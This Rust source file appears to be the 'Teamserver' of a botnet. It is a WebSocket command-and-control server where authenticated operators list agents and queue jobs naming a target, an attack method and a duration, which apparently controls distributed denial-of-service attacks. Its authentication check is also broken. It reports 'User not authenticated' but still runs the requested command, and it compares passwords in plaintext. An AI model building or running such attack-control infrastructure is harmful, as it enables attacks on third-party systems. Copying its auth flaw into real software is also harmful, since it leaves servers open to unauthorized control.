use std::hash::RandomState;
use std::ops::Deref;
use std::str::FromStr;
use std::time::Duration;
use std::{collections::HashMap, sync::Arc};
use std::net::SocketAddr;

use serde::{Serialize, Deserialize};
use serde_json::{self, Value};

use futures::SinkExt;
use futures::stream::StreamExt;

use tokio::net::{TcpListener, TcpStream};
use tokio_tungstenite::tungstenite::protocol::Message;
use uuid::{NoContext, Timestamp, Uuid};

use crate::{AttackMethod, Job, MAShared, ProfileConfig};

#[derive(Debug, Serialize)]
enum ClientError {
    InvalidJsonFormat,
    InvalidJsonDatatype,
    NotFoundJsonParameter,
    Invalidusername,
    InvalidPassword,
    NoAuth,
    InvalidDuration,
    InvalidAttackMethod
}

#[derive(Serialize, Deserialize, Debug)]
enum Method {
    Auth,
    Jobs,
    ListAgents,
    AddJob,
}

#[derive(Serialize, Deserialize, Debug)]
struct RequestJson<T> {
    method: Method,
    parameters: HashMap<String, T>
}

#[derive(Serialize)]
struct ErrorResponseJson {
    error: ClientError,
    message: String
}

#[derive(Serialize)]
struct ResponseJson<T> {
    data: T
}

fn auth(profile: Arc<ProfileConfig>, username: String, password: String) -> Result<(), ClientError> {
    let username_config = profile.deref()
        .users[username]
        .clone();

    if username_config.is_null() {
        return Err(ClientError::Invalidusername) 
    }

    if username_config.as_str().unwrap().eq(&password) {
        Ok(())
    } else {
        Err(ClientError::InvalidPassword)
    }
}

fn find_parameter_json(parameters: HashMap<String, Value, RandomState>, parameter_name: &str) -> Result<String, ErrorResponseJson> { 
    match parameters.get(parameter_name) {
        Some(r) => {
            if let Some(s) = r.as_str() {
                Ok(s.to_string())
            } else {
                Err(ErrorResponseJson { 
                    error: ClientError::InvalidJsonDatatype, 
                    message: "Invalid JSON datatype".to_string() 
                })
            }
        },
        None => {
            Err(ErrorResponseJson { error: ClientError::NotFoundJsonParameter, message: format!("'{}' paramenter not found", parameter_name) })
        }
    }
}

async fn method_managment(msgjson: RequestJson<Value>, shared: Arc<MAShared>) -> Option<Message> {
    let message: Option<Message> = match msgjson.method {
        Method::Auth => None,
        Method::Jobs => {
            Some(Message::Text(
                    serde_json::to_string(&ResponseJson{ data: shared.jobs.lock().await.deref() }).unwrap()
                    )
                )
        },
        Method::ListAgents => {
            Some(Message::Text(
                    serde_json::to_string(&ResponseJson { data: shared.agents.lock().await.deref() }).unwrap()
            ))
        },
        Method::AddJob => 'c: {
            let target = match find_parameter_json(msgjson.parameters.to_owned(), "target") {
                Ok(r) => r,
                Err(e) => {
                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
                }
            };

            let method = match find_parameter_json(msgjson.parameters.to_owned(), "method") {
                Ok(r) => {
                    if let Ok(am) = AttackMethod::from_str(&r) {
                        am
                    } else {
                        let error = serde_json::to_string(
                                &ErrorResponseJson { error: ClientError::InvalidAttackMethod, message: "Invalid attack method".to_string() }
                            ).unwrap();
                        break 'c Some(Message::Text(error))
                    }
                },
                Err(e) => {
                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
                }
            };

            let duration = match find_parameter_json(msgjson.parameters, "duration") {
                Ok(r) => {
                    match r.parse::<f32>() {
                        Ok(rint) => Duration::from_secs_f32(rint), 
                        Err(_) => {
                            let error = serde_json::to_string(
                                    &ErrorResponseJson { error: ClientError::InvalidDuration, message: "Invalid duration".to_string() }
                                ).unwrap();
                            break 'c Some(Message::Text(serde_json::to_string(&error).unwrap()))
                        },
                    }
                },
                Err(e) => {
                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
                }
            };

            let new_job = Job { 
                uuid: Uuid::new_v7(Timestamp::now(NoContext)).to_string(),
                duration,
                target,
                method,
                agents: 0
            };

            shared.jobs.lock().await.push(new_job);

            Some(Message::Text(
                serde_json::to_string(&ResponseJson { data: "ok" }).unwrap())
            )
        },  
    };

    message
}

async fn handle_connection(
        stream: TcpStream, 
        addr: SocketAddr,
        shared: Arc<MAShared>,
    ) {
    println!("New client connection: {}", addr);

    let mut authed = false;
    let ws_stream = tokio_tungstenite::accept_async(stream)
        .await
        .unwrap();

    let (mut writer, mut reader) = ws_stream.split();

    while let Some(msg) = reader.next().await {
        let profile_clone = Arc::clone(&shared.profile);
        let msg = msg.unwrap();

        match msg {
            Message::Text(data) => {
                let msgjson: RequestJson<Value> = match serde_json::from_str(&data) {
                    Ok(r) => r,
                    Err(e) => {
                        let error  = serde_json::to_string(
                            &ErrorResponseJson { error: ClientError::InvalidJsonFormat, message: e.to_string() }
                        ).unwrap();

                        writer.send(Message::Text(error)).await.unwrap();
                        break
                    }
                };

                dbg!(&msgjson);

                if let Method::Auth = msgjson.method {
                    let username = match find_parameter_json(msgjson.parameters.to_owned(), "username") {
                        Ok(r) => r,
                        Err(e) => {
                            writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();

                            break
                        }
                    };
                    let password = match find_parameter_json(msgjson.parameters.to_owned(), "password") {
                        Ok(r) => r,
                        Err(e) => {
                            writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();

                            break
                        }
                    };

                    match auth(profile_clone, username, password) {
                        Ok(()) => authed = true,
                        Err(e) => {
                            let message = match e {
                                ClientError::Invalidusername => "Invalid username".to_string(),
                                ClientError::InvalidPassword => "Invalid password".to_string(),
                                _ => panic!("Case not covered")
                            };

                            let error = serde_json::to_string(
                                &ErrorResponseJson { error: e, message: message.to_string() }
                            );
                            writer.send(Message::Text(error.unwrap())).await.unwrap();

                            break
                        }
                    }

                    writer.send(Message::Text(
                            serde_json::to_string(&ResponseJson { data: "ok" }).unwrap())
                    ).await.unwrap();
                } else {
                    if !authed {
                        let error = serde_json::to_string(
                            &ErrorResponseJson { error: ClientError::NoAuth, message: "User not authenticated".to_string() }
                        ).unwrap();

                        writer.send(Message::Text(error)).await.unwrap();
                    }

                    if let Some(message) = method_managment(msgjson, shared.to_owned()).await {
                        writer.send(message).await.unwrap()
                    }
                }
            }
            Message::Binary(_data) => (),
            Message::Ping(_data) => (),
            Message::Pong(_data) => (),
            Message::Frame(_data) => (),
            Message::Close(_data) => (),
        }
    }
}

pub async fn run(server_addr: &str, shared: Arc<MAShared>) {
    let socket = TcpListener::bind(server_addr).await;
    let listener = socket.unwrap();

    println!("Teamserver listening on: {}", server_addr);

    while let Ok((stream, client_addr)) = listener.accept().await {
        let shared_clone = Arc::clone(&shared);

        tokio::spawn(handle_connection(
                stream, 
                client_addr,
                shared_clone
            )
        );
    }
}
